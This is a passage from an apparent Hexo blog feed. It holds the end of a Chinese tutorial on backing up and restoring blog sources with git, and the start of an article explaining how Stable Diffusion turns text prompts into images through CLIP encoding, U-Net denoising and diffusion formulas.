rm origin</span><br><span class="line">git remote add origin 【HTTPS Git 地址】</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新添加仓库</span></span><br></pre></td></tr></table></figure><p>然后输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &#x27;source&#x27; # 引号里的东西可自定义带必须要有，作为推送摘要。</span><br><span class="line">git push origin main # 把本地仓库 push 到 github 上，如果没有配置密钥，此步骤需要输入账户密码</span><br></pre></td></tr></table></figure><h2 id="恢复">恢复</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone -b hexo git@github.com:【用户名/组织名】/【仓库名】.git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在本地新拷贝的【仓库名】.git 文件夹下通过 Git bash 依次执行下列指令：</span></span><br><span class="line">npm install hexo</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不要 hexo init！！！</span></span><br></pre></td></tr></table></figure><h1>后记</h1><blockquote><p>该操作会影响博客仓库的部署吗？</p></blockquote><p>编译后的文件部署是根据<code>_config.yml</code>中的配置执行，与前面备份源文件不冲突（除非你把备份和部署的仓库与分支均设置成同一个）。</p><blockquote><p>备份后发现 GitHub 仓库中 themes 文件夹中的主题文件夹上有白色箭头，点击无法访问</p></blockquote><p>大概率是这个主题文件夹里面有<code>.git</code>文件夹（可能会被系统隐藏），GitHub 就将它视为一个子系统模块了。</p><p>删除文件夹里面的<code>.git</code>文件夹，然后在<code>【blogroot】</code>目录下打开 Git 终端依次执行以下命令（假设你使用的主题是<code>butterfly</code>且文件夹名也是这个；你将要推送到 GitHub 仓库分支名为<code>main</code>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git rm --cached themes/butterfly</span><br><span class="line">git add themes/butterfly</span><br><span class="line">git commit -m &quot;msg&quot;</span><br><span class="line">git push origin main </span><br></pre></td></tr></table></figure><p>一般执行完前两条后，按照本文前面<code>推送</code>那节中<code>重新添加仓库</code>一条执行，即可推送成功。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> 命令 </tag>
            
            <tag> GitHub </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stable Diffusion 是如何生成图像的</title>
      <link href="/posts/1817611129/"/>
      <url>/posts/1817611129/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Stable Diffusion 模型是由 Stability AI、LAION 等公司共同开发的生成式模型，可以用于文生图、图生图、图像重绘等。使用者可以通过提示词，基于扩散模型的架构，通过逐步去噪声的方式，将随机噪声转化为清晰图像。得益于其开放性和灵活性，户能够在本地部署运行它；在爱好者和社区的支持下，它的生态发展良好、部署成本逐渐降低。</p><p>AUTOMATIC1111 的 stable-diffusion-webui 项目是一个基于 Stable Diffusion 模型的图形化界面，它的出现大大降低了 SD 的使用难度。</p><p>早期的 AI 绘图不够成熟，而其算法在经过了不断优化后，到了近两年，它的出图质量得到了显著提升。现在，你可以将你心中所想的画面，通过单词或句子进行描述，剩下的就交给 AI 了。</p><h3 id="与人类绘画相比">与人类绘画相比</h3><p>与人类绘画不同，艺术家通过手工操作，使用画笔、颜料等工具，依靠个人的技艺与创造力，逐步完成作品。一名优秀的画师，需要掌握许多绘画的技巧，有的还要学习色彩理论、构图等专业知识，并反复练习。其创作的时长视作品复杂程度而定，可能需要数小时、数天甚至数月。</p><p>AI 可不会这些东西。它基于深度学习和计算机视觉技术，通过一定的数学方法进行计算，依赖于预先训练的模型，其风格和内容受到训练数据的限制。它通常在几秒钟内完成一张图，效率极高，也较普通。</p><h3 id="图像如何生成">图像如何生成</h3><h4 id="提示词经历了什么">提示词经历了什么</h4><p>计算机不能直接理解人类语言，因此需要进行转换。在 Stable Diffusion 中，文本信息首先通过 Text Encoder（文本编码器），将提示词转换为语义向量，使用 CLIP（Contrastive Language–Image Pre-training）的模型完成。</p><p>这是一种多模态预训练神经网络，由 OpenAI 在 2021 年发布。CLIP 是多模态的，包含图像处理以及文本处理两个方面。它使用大量无标签数据进行配对训练，最终得到学习图像和文本之间的关系，生成文本的向量表示方法。</p><p>捕捉到文本的语义信息后，模型能够理解文本的内容。随后，这些信息被送入 Image Generator 进行接下来的流程。</p><h4 id="采样与噪声">采样与噪声</h4><p>U-Net 是一种典型的卷积神经网络架构，特别适用于图像生成和分割任务。它主要由编码器（下采样）和解码器（上采样）两部分组成，中间通过跳跃连接（skip connections）进行联系，用于保留细节信息。</p><p>编码器通过一系列卷积层和池化层逐步提取输入图像的特征，同时降低图像的空间维度。每个卷积层后通常会跟随 ReLU 激活函数。经编码器处理，得到输入图像的特征，并降低其大小。</p><p>解码器通过转置卷积（或上采样）逐步恢复图像的空间分辨率，逐步生成分割结果，生成输出图像。每一步的解码都结合了相应的跳跃连接，帮助模型有效地重构图像。</p><p>在编码器和解码器之间，U-Net 利用跳跃连接，将编码器中某一层的特征图直接连接到解码器中对应层的输入。这样做的好处是，解码器在重建图像时能够保留更多的细节，减少信息的丢失。</p><p>这种方式形似 U 型网络结构，故得名。</p><p>在 Stable Diffusion 中，U-Net 网络结构包含多个编码器和解码器层，它负责预测噪声，不断调整接下来的生成方向；Schedule 算法则负责优化 U-Net 的预测结果。这种设计使得模型能够有效地捕捉多尺度的图像信息，从而生成更清晰和细致的图像。</p><h4 id="扩散">扩散</h4><p>在扩散之前，模型的输入是一个随机生成的噪声图像。此时的噪声图像并不包含任何有意义的信息，而是一个布满噪点的画布。在图像生成的初始阶段，生成器接收一个这样的随机噪声图像作为输入。然后，整个过程遵循正向扩散的设计，即逐渐添加噪声，模拟随机过程，最终将图像转变为一个完全噪声的状态，这个过程被称为正向扩散。</p><p>先从真实数据（如图像）中采样。我们用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( x_0 )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 来表示原始图像。之后逐步添加噪声：，在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( T )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span> 个时间步中，逐步向原始图像 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mn>0</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( x_0 )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 添加高斯噪声。每经过一步 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( t )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mclose">)</span></span></span></span>，图像变为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mi>t</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( x_t )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>:</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>x</mi><mi>t</mi></msub><mo>=</mo><msqrt><msub><mi>α</mi><mi>t</mi></msub></msqrt><msub><mi>x</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>+</mo><msqrt><mrow><mn>1</mn><mo>−</mo><msub><mi>α</mi><mi>t</mi></msub></mrow></msqrt><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">x_t = \sqrt{\alpha_t} x_{t-1} + \sqrt{1 - \alpha_t} \epsilon </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.2658em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7742em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7342em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2658em;"><span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.1589em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8811em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.8411em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1589em;"><span></span></span></span></span></span><span class="mord mathnormal">ϵ</span></span></span></span></span></p><p>这里，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>ϵ</mi><mi>t</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( \epsilon_t )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">ϵ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 是从标准正态分布中采样的噪声，而 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>α</mi><mi>t</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( \alpha_t )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 是一个控制噪声强度的参数（通常会随着时间增加而降低）。</p><p>最终噪声图像：经过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( T )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span> 次迭代后，最终生成一个几乎完全由噪声组成的图像 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mi>T</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( x_T )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。这一过程使得原始图像与噪声混合，逐渐丧失信息。</p><p>反向扩散模型使用 U-Net 网络架构来实现这一过程。在这里，使用预训练好的 U-Net 模型对噪声图像逐步去噪，并将文本编码信息融入到生成的图像中。在每一步中，U-Net 都会根据当前的图像状态和文本向量，预测出应该去掉的噪声，并生成更清晰的图像：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>x</mi><mrow><mi>t</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mfrac><mn>1</mn><msqrt><msub><mi>α</mi><mi>t</mi></msub></msqrt></mfrac><mrow><mo fence="true">(</mo><msub><mi>x</mi><mi>t</mi></msub><mo>−</mo><msqrt><mrow><mn>1</mn><mo>−</mo><msub><mi>α</mi><mi>t</mi></msub></mrow></msqrt><msub><mi>ϵ</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mi>t</mi></msub><mo separator="true">,</mo><mi>t</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">x_{t-1} = \frac{1}{\sqrt{\alpha_t}} \left( x_t - \sqrt{1 - \alpha_t} \epsilon_{\theta}(x_t, t, c) \right) </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3222em;vertical-align:-1.0007em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7253em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.6853em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3147em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0007em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8811em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.8411em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1589em;"><span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">ϵ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">θ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></span></p><p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>ϵ</mi><mi>θ</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( \epsilon_\theta )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">ϵ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 是 U-Net 模型的输出，表示对噪声的预测；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span> 表示条件信息。</p><p>在这个过程中，图像由噪点逐渐变得清晰（如果你使用过 SD-WebUI 